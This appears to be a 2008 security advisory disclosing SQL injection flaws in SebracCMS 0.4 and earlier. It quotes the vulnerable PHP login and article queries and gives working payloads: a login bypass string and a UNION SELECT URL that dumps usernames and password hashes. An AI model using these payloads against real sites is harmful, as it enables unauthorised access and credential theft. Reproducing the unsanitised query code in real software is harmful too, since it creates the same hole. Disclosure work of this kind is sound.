SebracCMS <= 0.4 Multiple SQL Injection Vulnerabilities
=======================================================



# Name: SebracCMS
# Webiste: http://www.sebrac.netsons.org/cms/
# Vulnerability type: SQL Injection
# Author:
#         shinmai, 2008-06-28
######################################################################################
# Description:
#
# SebracCMS contains two major SQL injection vulnerabilities:
# Unsanitazed POST-variables in SQL queries when logging users in. This allows
# login access without proper credentials.
# And unsanitized GET-variables in SQL queries when loading articles.
This allows
# an attacker to read all usernames and passwordhashes in the database.
#
# Vulnerable code in cms/index.php:

$n=$_POST[&#039;uname&#039;];
$p= strtolower($_POST[&#039;upass&#039;]);
$cryp_p = md5($p);
//connect to db
include(&#039;incls/config.php&#039;);
$query="select * from sbc_user where uname=&#039;$n&#039; and pw=&#039;$cryp_p&#039;";

#
# POC
#
# using
admin&#039; OR &#039;1&#039;=&#039;1
# as the username will allow login without proper registered credentials
#
#
# The second and far more serious SQL Injection is in cms/form/read.php
#
# This vulnerability allows an attacker to reveal all users and their
md5-password hashes.
#
#
# Vulnerable code in cms/form/read.php:

$rec=($_GET[&#039;recid&#039;]);
*SNIP*
$query="Select * from sbc_articles where idart= &#039;$rec&#039;" or die(mysql_error());

#
# POC
#
# using
1&#039; UNION ALL SELECT uname, uname, uname, pw, uname FROM sbc_user WHERE &#039;1&#039;=&#039;1
# as the GET-variable &#039;recid&#039; reveals the first post along with all
registered users and their passwordhashes.
# Example:
http://localhost/sbcms/cms/form/read.php?recid=1&#039; UNION ALL SELECT
uname, uname, uname, pw, uname FROM sbc_user WHERE &#039;1&#039;=&#039;1

#
# There are some other SQLI-vulnerabilities there, but these two are
the most severe. I was going to include
# one more for changing any users password, but I simply didn&#039;t have
the time to start crafting very complex
# injections. Also, I have a sneaking suspicion there&#039;s a
LFI-vulnerability in the photo-gallery code in the CMS,
# but if there is one, I&#039;ll write up an other advisory on that.
#
# As always, Good luck and be safe.



